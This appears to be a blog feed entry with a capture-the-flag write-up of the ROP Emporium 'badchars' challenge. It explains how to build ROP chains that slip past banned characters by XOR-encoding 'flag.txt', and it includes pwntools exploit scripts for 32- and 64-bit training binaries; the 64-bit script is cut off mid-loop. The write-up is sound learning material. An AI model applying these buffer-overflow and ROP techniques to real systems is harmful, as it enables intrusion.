@@ -1,0 +1,788 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.1">Jekyll</generator><link href="https://parroquet.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://parroquet.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2023-01-02T23:24:42+00:00</updated><id>https://parroquet.github.io/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">ROP Emporium - badchars</title><link href="https://parroquet.github.io/blog/2023/badchars/" rel="alternate" type="text/html" title="ROP Emporium - badchars"/><published>2023-01-02T21:12:00+00:00</published><updated>2023-01-02T21:12:00+00:00</updated><id>https://parroquet.github.io/blog/2023/badchars</id><content type="html" xml:base="https://parroquet.github.io/blog/2023/badchars/"><![CDATA[<h2 id="basic-setup">Basic setup:</h2> <ul> <li>ROPEmporium x86 &amp; x86_64 binaries</li> <li>Ubuntu lab machine</li> <li>GDB &amp; pwndbg</li> <li>pwntools</li> </ul> <p> </p> <h3 id="link-to-challenge">Link to challenge</h3> <p><a href="https://ropemporium.com/challenge/badchars.html">https://ropemporium.com/challenge/badchars.html</a></p> <p> </p> <h3 id="the-32-bit-solve">The 32 bit solve</h3> <p>The aim of this challenge is similar to the challenge before (write4) where we aim to write the string “flag.txt” to an area of free memory so that the imported function <strong>print_file</strong> can be called with this argument which would print the flag. For this we need to utilise multiple ROP gadgets to build a ROP chain which can do this for us. However, some characters (a,g,x and .) have been banned and we need to find a work around. To do this work around, I used a XOR gadget which could bypass these banned characters being written.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/1checksec.png" alt="checksec" width="750"/></p> <p>The first step is to run <strong>checksec</strong> in order to find protections. Like usual, NX in enabled and partial RELRO exists so a ROP chain is required.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/2rabin.png" alt="rabin" width="750"/></p> <p>Using the <strong>rabin2</strong> command we can see the strings with the -z flag as well as the imported functions with the -i flag. Here we can see the address of the print_file function which we will need to call. However, nothing else of use seeems to be present and we will need to utilise writeable memory locations to store strings. We also used the -S flag here to list the sections so that we can find a writeable area of memory with atleast 8 bytes of space for us to store the “flag.txt” string. The .data section meets this criteria so its address can be noted.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/3usefulgadgets.png" alt="usefulgadgets" width="750"/></p> <p>Opening the binary up within pwndbg, we can disassemble the usefulGadgets function in order to find some gadgets which may be worth taking note of. As usual, we see this <strong>mov DWORD PTR [edi],esi ; ret</strong> gadget which will be useful for us when writing values to the writeable memory section. We also see the gadget <strong>xor BYTE PTR [ebp+0x0], bl ; ret</strong> which can be used to XOR a specific byte with the lower quadrant of the ebx register (bottom 8). We can use this for each banned character by converting a valid string to “flag.txt” before we call print_file.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/4usefulfunction.png" alt="usefulfunction" width="750"/></p> <p>The function usefulFunction also exists which we can see the address of the <strong>call print_file</strong> instruction. We will be using the address on the far left here as this will mean that we do not need to provide a junk return address when using just <strong>print_file</strong>.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/5xor.png" alt="xor" width="750"/></p> <p>Now we have found some useful gadgets and the address for the print_file call, we can develop our logic for the XOR shenanigans. We can use <strong>Cyberchef</strong> to convert the banned characters to new characters using XOR with a key of the letter <strong>K</strong>. This will give us the characters <strong>*,e3</strong> which are valid characters. This makes our string <strong>fl*,et3t</strong> instead of <strong>flag.txt</strong>. We can then use the XOR gadget before calling the print_file instruction to convert the string back to <strong>flag.txt</strong> so that we can bypass inputting the invalid characters.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/6popformoving.png" alt="popformoving" width="750"/></p> <p>As we start to order our payload in a separate text file, we now need to find our supplimentary gadgets so that our <strong>xor BYTE PTR [ebp+0x0], bl ; ret</strong> and <strong>mov DWORD PTR [edi],esi ; ret</strong> gadgets can be used with correct values in registers. We can use the <strong>ROPgadget</strong> command to search for these and we can copy the address. Here we see <strong>pop esi ; pop edi ; pop ebp ; ret</strong> which we can use to set both registers within the gadget <strong>mov DWORD PTR [edi],esi ; ret</strong>.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/7popebp.png" alt="popebp" width="750"/></p> <p>We now need to find a gadget which will allow us to set the value of ebp for the XOR gadget. This value will hold the address of the .data section for writing to. Through the command used before, we can search for <strong>pop ebp</strong> and we can see that a gadget for <strong>pop ebp ; ret</strong> is available so we can copy the address.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/8popebx.png" alt="popebx" width="750"/></p> <p>Lastly, for the XOR gadget, we need to find a gadget which will allow us to set the value of ebx. We can use the <strong>ROPgadget</strong> command again to search for <strong>pop ebx</strong> and we can see that a gadget for <strong>pop ebx ; ret</strong> is available so we can copy the address.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/14cyclic32.png" alt="cyclic32" width="750"/></p> <p>The final thing we need to do before writing our payload is to find the offset that the buffer overflow occurs at. As there is banned characters which we cannot input, we will need to use the <strong>cyclic</strong> command as usual but using the -a flag to specify the alphabet to use. We can use bcdefhijk as it is enough characters and excludes all the banned characters. This value can then be inputted into the input field and the value of EIP can be copied.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/15offset32.png" alt="offset32" width="750"/></p> <p>Now we can use the -l flag along with the alphabet parameter to find the offset of the buffer overflow. This value is 44.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/9order.png" alt="order" width="750"/></p> <p>Now we can order our payload and ROP chain. We first need to write the first 4 bytes of the string which avoids banned characters to the stack along with the .data address. We can use pop on line 1 to then move these into appropriate registers. The ebp register isn’t needed yet so we can fill it with random junk. The mov gadget can then be used to write the value in esi to the address of the .data section.</p> <p>We then need to repeat this process with the second half of the string, writing it after the previously written part by specifying the .data section + 0x4 bytes.</p> <p>A loop of through each banned character then is started which will XOR the correct index in memory with the lower quadrant of ebx. This will convert the stored valid characters to the desired banned characters we need.</p> <p>Finally, we can call the <strong>print_file</strong> function with the address of the .data section as the argument. This will print the flag.txt file to the terminal.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/10flag.png" alt="flag" width="750"/></p> <p>A python3 script was created to generate the payload and complete this exploit. It uses pwntools similar to the other challenges and as usual, will be available at the end of this post.</p> <p> </p> <h3 id="the-64-bit-solve">The 64 bit solve</h3> <p>The 64 bit version of this challenge is similar but handles arguments differently. We also do not need to handle the string in blocks of 4 bytes as 64 bit architecture increases this to 8 bytes.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/11rabin.png" alt="rabin" width="750"/></p> <p>Using the <strong>rabin2</strong> command we can see the strings with the -z flag as well as the imported functions with the -i flag. Here we can see the address of the print_file function which we will need to call. However, nothing else of use seeems to be present and we will need to utilise writeable memory locations to store strings. We also used the -S flag here to list the sections so that we can find a writeable area of memory with atleast 8 bytes of space for us to store the “flag.txt” string. The .data section meets this criteria so its address can be noted.</p> <p>It is worth noting that we can use the .data section here but we should keep in mind that data may be written during runtime to this section which would mess up our exploit. We can use the .bss section instead which is a section of memory which is not initialised and is writeable. This is a better option as it won’t be written to by anything else during runtime. For our exploit, we will be using the .data section and for it to work, we will need to start the address from .data_address + 0x2.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/12usefulfunction.png" alt="usefulfunction" width="750"/></p> <p>Following the same logic as the 32 bit challenge, we can disassemble the usefulFunction provided to copy the address of the <strong>call print_file</strong> instruction.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/13usefulgadgets.png" alt="usefulgadgets" width="750"/></p> <p>Looking at the usefulGadgets function, we can see new gadgets of interest. Specifically, we can see <strong>xor BYTE PTR [r15],r14b</strong> which we can use for our bad character bypass. We can also see <strong>mov QWORD PTR [r13+0x0],r12</strong> which we can use to write our string to the .data section.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/16cyclic64.png" alt="cyclic64" width="750"/></p> <p>Next we can get the offset for our exploit. Again we can use the <strong>cyclic</strong> command along with the -a flag to generate our input string. We can then input this into the input field and copy the value of RSP. We can then use the -l flag along with the alphabet parameter to find the offset of the buffer overflow.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/17offset64.png" alt="offset64" width="750"/></p> <p>This offset value is 40.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/18popall.png" alt="popall" width="750"/></p> <p>To accompany our <strong>mov QWORD PTR [r13+0x0],r12</strong> gadget, we need to fill the r13 and r12 registers. We can search using <strong>ROPgadget</strong> for a gadget which will allow us to do this. We can see that a gadget for <strong>pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</strong> is available so we can copy the address. r14 and r15 are not needed yet in our ordering logic so we can fill them with junk.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/19popr14.png" alt="popr14" width="750"/></p> <p>In order to accompany our <strong>xor BYTE PTR [r15],r14b</strong> gadget, we need to fill the r14 and r15 registers separately. We can search using <strong>ROPgadget</strong> for a gadget which will allow us to see a gadget for <strong>pop r14 ; pop r15 ; ret</strong> so we can copy the address.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/20poprdi.png" alt="poprdi" width="750"/></p> <p>64 bit architecture requires parameters inside the rdi register instead of being on the stack like the 32 bit architecture. We can search using <strong>ROPgadget</strong> for a gadget which will allow us pop rdi. A gadget for <strong>pop rdi ; ret</strong> exists so we can copy the address.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/22order.png" alt="order" width="750"/></p> <p>Finally, we can start to develop our exploit by working out the ordering. First, we will need to put our bypassing flag.txt string into the r12 register as well as the address of the .data section into the r13 register using our <strong>pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</strong> gadget. We can then use our <strong>mov QWORD PTR [r13+0x0],r12</strong> gadget to write the string to the .data section.</p> <p>Next, we will start a loop which will perform the converting of the valid characters into the banned characters we need to read the flag. We will need to fill the r14 register with the key for our XOR operating and the r15 register with the address of the .data section indexed at the byte we want to convert.</p> <p>After converting it all, we can populate the rdi register with the address of the .data section and call the <strong>print_file</strong> function which will get its required argument from the rdi register. The flag is then output to the screen.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/21flag.png" alt="flag" width="750"/></p> <p>A python3 script was created to generate the payload and complete this exploit. It uses pwntools similar to the other challenges and as usual, will be available at the end of this post.</p> <p> </p> <h2 id="the-32-bit-python-script">The 32 bit python script</h2> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">##### SETUP &amp; RUN #####
+</span>
+<span class="c1">#Define the executable
+</span><span class="n">exe</span> <span class="o">=</span> <span class="s">'./badchars32'</span>
+
+<span class="c1"># This will automatically get context arch, bits, os etc
+</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="c1"># verbose logging so we can see what is being sent
+</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>
+
+<span class="c1">#delete corefiles after crash occurs
+</span><span class="n">context</span><span class="p">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="c1"># run the elf
+</span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+
+<span class="c1">##### FIND USEFUL ADDRESSES #####
+</span>
+<span class="c1"># Locate the functions/strings we need - either do this manually or using pwntools
+</span>
+<span class="c1"># Address needed to put parameters in registers
+</span><span class="n">datasection</span> <span class="o">=</span> <span class="mh">0x0804a018</span>
+<span class="n">mov_gadget</span> <span class="o">=</span> <span class="mh">0x0804854f</span>
+<span class="n">pop_gadget</span> <span class="o">=</span> <span class="mh">0x080485b9</span>
+<span class="n">flagstr</span> <span class="o">=</span> <span class="mh">0x2c2a6c66</span>
+<span class="n">txtstr</span> <span class="o">=</span> <span class="mh">0x74337465</span>    <span class="c1"># writing text to memory requires little endian so it can be converted to big
+</span><span class="n">call_print_file</span> <span class="o">=</span> <span class="mh">0x08048538</span>
+<span class="n">junkaddr</span> <span class="o">=</span> <span class="mh">0x61616161</span>
+<span class="n">xor_gadget</span> <span class="o">=</span> <span class="mh">0x08048547</span>
+<span class="n">pop_ebx</span> <span class="o">=</span> <span class="mh">0x0804839d</span>
+<span class="n">pop_ebp</span> <span class="o">=</span> <span class="mh">0x080485bb</span>
+<span class="n">k</span> <span class="o">=</span> <span class="mh">0x0000004b</span>
+<span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span><span class="s">'a'</span><span class="p">,</span><span class="s">'g'</span><span class="p">,</span><span class="s">'.'</span><span class="p">,</span><span class="s">'x'</span><span class="p">]</span>
+
+<span class="c1"># Print out the target address
+</span><span class="n">info</span><span class="p">(</span><span class="s">"%#x writable .data section"</span><span class="p">,</span> <span class="n">datasection</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x mov DWORD PTR [edi], esi"</span><span class="p">,</span> <span class="n">mov_gadget</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop esi ; pop edi ; pop ebp ; ret"</span><span class="p">,</span> <span class="n">pop_gadget</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x fl*, (flag) string"</span><span class="p">,</span> <span class="n">flagstr</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x et3t (.txt) string"</span><span class="p">,</span> <span class="n">txtstr</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop ebx ; ret"</span><span class="p">,</span> <span class="n">pop_ebx</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop ebp ; ret"</span><span class="p">,</span> <span class="n">pop_ebp</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x Value of K used to xor"</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x xor BYTE PTR [ebp+0x0],bl ; ret"</span><span class="p">,</span> <span class="n">xor_gadget</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x call print_file"</span><span class="p">,</span> <span class="n">call_print_file</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x random junk address"</span><span class="p">,</span> <span class="n">junkaddr</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"Bad characters:"</span><span class="p">,</span> <span class="n">badchars</span><span class="p">)</span>
+
+
+
+<span class="c1">##### FIND CRASH OVERWRITE RETURN ADDRESS OFFSET #####
+</span>
+<span class="c1"># We will send a 'cyclic' pattern which overwrites the return address on the stack
+# needs alphabet parameter so that banned characters aren't used.
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span><span class="n">alphabet</span><span class="o">=</span><span class="s">'bcdefhijk'</span><span class="p">)</span>
+
+<span class="c1"># Send cyclic pattern to crash it
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Wait for the process to crash
+</span><span class="n">io</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>
+
+<span class="c1"># Open up the corefile created after crash
+</span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>
+
+<span class="c1"># Print out the address of EIP at the time of crashing
+</span><span class="n">eip_value</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">eip</span>
+<span class="c1"># cyclic find needs alphabet parameter so that banned characters aren't used.
+</span><span class="n">eip_offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">eip_value</span><span class="p">,</span><span class="n">alphabet</span><span class="o">=</span><span class="s">'bcdefhijk'</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">'located EIP offset at {a}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">eip_offset</span><span class="p">))</span>
+
+<span class="c1">##### CRAFTING PAYLOAD #####
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="n">eip_offset</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_gadget</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">flagstr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">junkaddr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mov_gadget</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_gadget</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">txtstr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span> <span class="c1"># +4 so that we don't overwrite our "flag" string
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">junkaddr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mov_gadget</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">:</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebp</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'a'</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">)</span> <span class="c1"># a value
+</span>    <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'g'</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">)</span> <span class="c1"># g value
+</span>    <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'.'</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span> <span class="c1"># . value
+</span>    <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'x'</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x6</span><span class="p">)</span> <span class="c1"># x value
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">xor_gadget</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">call_print_file</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>
+
+
+<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1">##### SEND PAYLOAD AND GET FLAG #####
+</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Thank you!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+<span class="c1">#Get our flag!
+</span><span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+<span class="c1">##### END #####
+</span></code></pre></div></div> <p> </p> <h2 id="the-64-bit-python-script">The 64 bit python script</h2> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">##### SETUP &amp; RUN #####
+</span>
+<span class="c1">#Define the executable
+</span><span class="n">exe</span> <span class="o">=</span> <span class="s">'./badchars'</span>
+
+<span class="c1"># This will automatically get context arch, bits, os etc
+</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="c1"># verbose logging so we can see what is being sent
+</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>
+
+<span class="c1">#delete corefiles after crash occurs
+</span><span class="n">context</span><span class="p">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="c1"># run the elf
+</span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+
+<span class="c1">##### FIND USEFUL ADDRESSES #####
+</span>
+<span class="c1"># Locate the functions/strings we need - either do this manually or using pwntools
+</span>
+<span class="n">call_print_file</span> <span class="o">=</span> <span class="mh">0x0000000000400620</span>
+<span class="n">mov_qword_gadget</span> <span class="o">=</span> <span class="mh">0x0000000000400634</span>
+<span class="n">pop_rdi_gadget</span> <span class="o">=</span> <span class="mh">0x00000000004006a3</span>
+<span class="n">pop_r14_r15_gadget</span> <span class="o">=</span> <span class="mh">0x00000000004006a0</span>
+<span class="n">pop_r12_r13_r14_r15</span> <span class="o">=</span> <span class="mh">0x000000000040069c</span>
+<span class="n">datasection</span> <span class="o">=</span> <span class="mh">0x0000000000601030</span>
+<span class="n">flagtxtstr</span> <span class="o">=</span> <span class="mh">0x743374652c2a6c66</span>
+<span class="n">junkaddr</span> <span class="o">=</span> <span class="mh">0x6161616161616161</span>
+<span class="n">k</span> <span class="o">=</span> <span class="mh">0x000000000000004b</span>
+<span class="n">xor_gadget</span> <span class="o">=</span> <span class="mh">0x0000000000400628</span>
+
+<span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span><span class="s">'a'</span><span class="p">,</span><span class="s">'g'</span><span class="p">,</span><span class="s">'.'</span><span class="p">,</span><span class="s">'x'</span><span class="p">]</span>
+
+
+<span class="c1"># Print out the target address
+</span><span class="n">info</span><span class="p">(</span><span class="s">"%#x writable .data section"</span><span class="p">,</span> <span class="n">datasection</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x mov QWORD PTR [r13+0x0], r12"</span><span class="p">,</span> <span class="n">mov_qword_gadget</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret"</span><span class="p">,</span> <span class="n">pop_r12_r13_r14_r15</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x fl*,et3t (flag.txt) string"</span><span class="p">,</span> <span class="n">flagtxtstr</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop rdi ; ret"</span><span class="p">,</span> <span class="n">pop_rdi_gadget</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop r14 ; pop r15 ; ret"</span><span class="p">,</span> <span class="n">pop_r14_r15_gadget</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x Value of K used to xor"</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x xor BYTE PTR [r14],r14b ; ret"</span><span class="p">,</span> <span class="n">xor_gadget</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x call print_file"</span><span class="p">,</span> <span class="n">call_print_file</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x random junk address"</span><span class="p">,</span> <span class="n">junkaddr</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"Bad characters:"</span><span class="p">,</span> <span class="n">badchars</span><span class="p">)</span>
+
+
+<span class="c1">##### FIND CRASH OVERWRITE RETURN ADDRESS OFFSET #####
+</span>
+<span class="c1"># We will send a 'cyclic' pattern which overwrites the return address on the stack
+# needs alphabet parameter so that banned characters aren't used.
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span><span class="n">alphabet</span><span class="o">=</span><span class="s">'bcdefhijk'</span><span class="p">)</span>
+
+<span class="c1"># Send cyclic pattern to crash it
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Wait for the process to crash
+</span><span class="n">io</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>
+
+<span class="c1"># Open up the corefile created after crash
+</span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>
+
+<span class="n">stack</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">rsp</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x stack"</span><span class="p">,</span> <span class="n">stack</span><span class="p">)</span>
+
+<span class="c1"># Read four bytes from RSP, which will be some of our cyclic data.
+# With this snippet of the pattern, we know the exact offset from
+# the beginning of our controlled data to the return address.
+</span><span class="n">pattern</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="c1"># cyclic find needs alphabet parameter so that banned characters aren't used.
+</span><span class="n">offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">alphabet</span><span class="o">=</span><span class="s">'bcdefhijk'</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%r pattern (offset: %r)"</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
+
+<span class="c1">##### CRAFTING PAYLOAD #####
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="n">offset</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r12_r13_r14_r15</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">flagtxtstr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">junkaddr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">junkaddr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_qword_gadget</span><span class="p">)</span>
+
+    
+<span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">:</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r14_r15_gadget</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'a'</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'g'</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'.'</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span>
